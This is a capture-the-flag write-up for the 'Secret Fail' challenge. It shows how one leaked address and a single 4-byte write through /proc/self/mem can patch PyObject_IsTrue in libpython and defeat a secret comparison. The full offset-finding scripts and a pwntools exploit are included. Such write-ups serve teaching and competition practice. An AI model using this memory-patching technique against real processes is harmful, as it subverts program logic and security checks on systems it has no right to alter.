# Secret Fail — CTF Writeup

**Challenge:** Secret Fail (AlpacaHack)
**Category:** pwn / exploitation
**Hint in description:** *"Nice work on Copy Fail and Shredder Challenge :D"* — a reference to [CVE-2026-31431 "Copy Fail"](https://xint.io/blog/copy-fail-linux-distributions), which shares the same exploitation primitive used here: an arbitrary 4-byte write.

## Challenge overview

The challenge serves `server.py` over a socket. Source:

```python
import secrets

secret = secrets.token_hex(16)
guess = input("Secret: ")
assert len(secret) == len(guess)

# arbitrary 4-bytes write to memory :)
print(f"Hint: {id(0) = }")
mem = open("/proc/self/mem", "wb", buffering=0)
mem.seek(int(input("Offset: ")))
mem.write(bytes.fromhex(input("4-bytes (Hex): "))[:4])

if any(a != b for a, b in zip(secret, guess)):
    print("Wrong...")
else:
    print("Correct! Flag is Alpaca{REDACTED}")
```

The flow:

1. The server generates a 32-character hex secret and asks for our guess.
2. It prints the address of the `0` integer singleton — `id(0)` — as an info leak.
3. It opens `/proc/self/mem` and grants us **one 4-byte write to any address** in its own process memory.
4. It compares our guess to the secret. If they match, we get the flag.

Guessing the 32-char hex secret is `1/16**32 ≈ 1/3.4e38` — out of the question. The intended path is to use the 4-byte write to subvert the comparison itself.

---

## The vulnerability

`/proc/self/mem` is a kernel-provided file that maps the process's own virtual memory as a file. Writing to it bypasses normal page protection — including writes to pages mapped `r-xp` (executable, non-writable text segments). This was a hardening footgun famously involved in Dirty Cow and the Copy Fail CVE.

In this challenge we get:

- **One 4-byte write** at any offset.
- **One libpython address leaked** (`id(0)` lives inside `libpython3.14.so`'s BSS), which gives us the libpython base after subtracting a known constant.
- **A copy of the Python binary and libpython** to study locally.

This is enough to redirect program logic anywhere we want in the loaded `libpython.so` text segment.

---

## Exploit: patching `PyObject_IsTrue`

`any(...)` is implemented in C as `builtin_any`. For each item it calls **`PyObject_IsTrue`**. The disassembly of `PyObject_IsTrue` in libpython 3.14:

```asm
00000000001ce8f0 <PyObject_IsTrue>:
  1ce8f0:  f3 0f 1e fa             endbr64
  1ce8f4:  48 3b 3d 0d 43 30 00    cmp    [Py_True_addr], %rdi
  1ce8fb:  74 63                   je     1ce960              <-- if v == Py_True, jump to "return 1"
  1ce8fd:  48 3b 3d 8c 44 30 00    cmp    [Py_None_addr], %rdi
  1ce904:  74 09                   je     1ce90f              <-- if v == Py_None, return 0
  1ce906:  48 3b 3d 8b 42 30 00    cmp    [Py_False_addr], %rdi
  1ce90d:  75 09                   jne    1ce918              <-- if v != Py_False, go to nb_bool path
  1ce90f:  31 c0                   xor    %eax, %eax
  1ce911:  c3                      ret                        <-- return 0
  ...
  1ce960:  b8 01 00 00 00          mov    $0x1, %eax          <-- "return 1" landing
  1ce965:  c3                      ret
```

The "return 1" path at `0x1ce960` is just `b8 01 00 00 00` (`mov $0x1, %eax`) followed by `c3` (`ret`).

**The patch:** turn `mov $0x1, %eax` into `mov $0x0, %eax`. The opcode `b8` stays put; we overwrite the 4-byte immediate `01 00 00 00` at offset `0x1ce961` with `00 00 00 00`.

After the patch, `PyObject_IsTrue(Py_True)` returns **0**. So:

```
zip(secret, guess) → 32 pairs of unequal 1-char strings
each (a != b)      → Py_True
any(...)           → for each item: PyObject_IsTrue(Py_True) == 0 → never short-circuits → returns False
if False:          → fall through to else branch → flag printed
```

This works regardless of struct layouts, regardless of upper-32-bits assumptions, regardless of bool's specialization. We're writing into the actual instruction stream of a function `any()` definitely calls.

---

### Step 1 — Pull the binaries out of the container

```bash
$ docker ps
CONTAINER ID   IMAGE                   ...   NAMES
43a9c8e92808   secret-fail-challenge   ...   secret-fail-challenge-1

$ docker cp secret-fail-challenge-1:/usr/local/bin/python3.14 ./python_bin
$ docker cp secret-fail-challenge-1:/usr/local/lib/libpython3.14.so.1.0 ./libpython.so
```

### Step 2 — Find the libpython offset of `id(0)`

`id(0)` returns the address of the cached `0` integer singleton, which lives inside libpython's BSS at a fixed offset. We need that offset to translate the leaked address into a libpython base at exploit time.

`find_offsets.py` (run inside the container):

```python
import sys

id_0 = id(0)
print(f"id(0) address: {hex(id_0)}")

with open('/proc/self/maps') as f:
    maps = f.readlines()

target_path = None
for line in maps:
    parts = line.split()
    if len(parts) < 6: continue
    start, end = [int(x, 16) for x in parts[0].split('-')]
    if start <= id_0 < end:
        target_path = parts[-1]
        print(f"id(0) resides inside: {target_path}")
        break

if target_path:
    for line in maps:
        if target_path in line:
            base_addr = int(line.split('-')[0], 16)
            offset = id_0 - base_addr
            print(f"Base address of {target_path}: {hex(base_addr)}")
            print(f"--> EXACT OFFSET to use in exploit: {hex(offset)}")
            break
```

Output:

```
id(0) address: 0x7fb9611f4550
id(0) resides inside: /usr/local/lib/libpython3.14.so.1.0
Base address of /usr/local/lib/libpython3.14.so.1.0: 0x7fb960cde000
--> EXACT OFFSET to use in exploit: 0x516550
```

So `libpython_base = leaked_id0 - 0x516550`.

### Step 3 — Find `PyObject_IsTrue` and dump its bytes

Even though libpython is stripped of static symbols (`nm libpython.so` returns "no symbols"), CPython exports its public C API in the **dynamic symbol table**, so `ctypes.CDLL` can still resolve `PyObject_IsTrue`. Run inside the container:

```bash
docker exec secret-fail-challenge-1 python3.14 -c '
import ctypes
libp = ctypes.CDLL("/usr/local/lib/libpython3.14.so.1.0")
fn_addr = ctypes.cast(libp.PyObject_IsTrue, ctypes.c_void_p).value

# Resolve libpython base via /proc/self/maps
id_0 = id(0)
with open("/proc/self/maps") as f: lines = f.readlines()
path = None
for line in lines:
    p = line.split()
    if len(p) < 6: continue
    s, e = [int(x,16) for x in p[0].split("-")]
    if s <= id_0 < e: path = p[-1]; break
base = None
for line in lines:
    if path and path in line:
        base = int(line.split("-")[0], 16); break

print(f"libpython base: {hex(base)}")
print(f"PyObject_IsTrue addr: {hex(fn_addr)}")
print(f"PyObject_IsTrue offset: {hex(fn_addr - base)}")

data = bytes((ctypes.c_ubyte*80).from_address(fn_addr))
print(f"First 80 bytes: {data.hex()}")
'
```

Output:

```
libpython base: 0x7fb8b38b0000
PyObject_IsTrue addr: 0x7fb8b3a7e8f0
PyObject_IsTrue offset: 0x1ce8f0
First 80 bytes: f30f1efa483b3d0d4330007463...
```

### Step 4 — Disassemble locally to find the exact instruction byte

Even though `objdump --disassemble=PyObject_IsTrue libpython.so` doesn't work on the stripped library (the name isn't in the static symbol table), the **offset** from step 3 works fine:

```bash
OFFSET=0x1ce8f0
objdump -d --start-address=$OFFSET --stop-address=$((OFFSET + 0x100)) libpython.so
```

This produced the disassembly shown above and revealed the target instruction at `0x1ce960`:

```
1ce960:  b8 01 00 00 00          mov    $0x1, %eax
1ce965:  c3                      ret
```

The 4-byte write goes at `0x1ce961` and replaces `01 00 00 00` with `00 00 00 00`.

---

## Final exploit code

```python
from pwn import *

# Constants
ID_0_OFFSET     = 0x516550   # libpython offset of the id(0) singleton (from find_offsets.py)
PATCH_OFFSET    = 0x1ce961   # libpython offset of the immediate inside "mov $0x1, %eax"
                             #   inside PyObject_IsTrue's "return 1" path

io = remote('127.0.0.1', 1337)

# The assert checks len(secret) == len(guess); secrets.token_hex(16) -> 32 chars.
io.sendlineafter(b"Secret: ", b"A" * 32)

# Use the leak to compute libpython's load address.
io.recvuntil(b"Hint: id(0) = ")
id_0_addr = int(io.recvline().strip())
libpython_base = id_0_addr - ID_0_OFFSET
log.success(f"libpython base: {hex(libpython_base)}")

# Compute write target.
target = libpython_base + PATCH_OFFSET
log.info(f"Patching mov $0x1,%eax -> mov $0x0,%eax at {hex(target)}")

# Perform the 4-byte write.
io.sendlineafter(b"Offset: ", str(target).encode())
io.sendlineafter(b"4-bytes (Hex): ", b"00000000")

# any(...) now sees every Py_True as false, takes the else branch, prints the flag.
print(io.recvall().decode())
```

Output:

```
[+] Opening connection to 34.170.146.252 on port 55826: Done
[+] libpython base: 0x7f207123f000
[*] Patching mov $0x1,%eax -> mov $0x0,%eax at 0x7f207140d961
[+] Receiving all data: Done (62B)
[*] Closed connection to 34.170.146.252 port 55826
Correct! Flag is Alpaca{REDACTED}
```
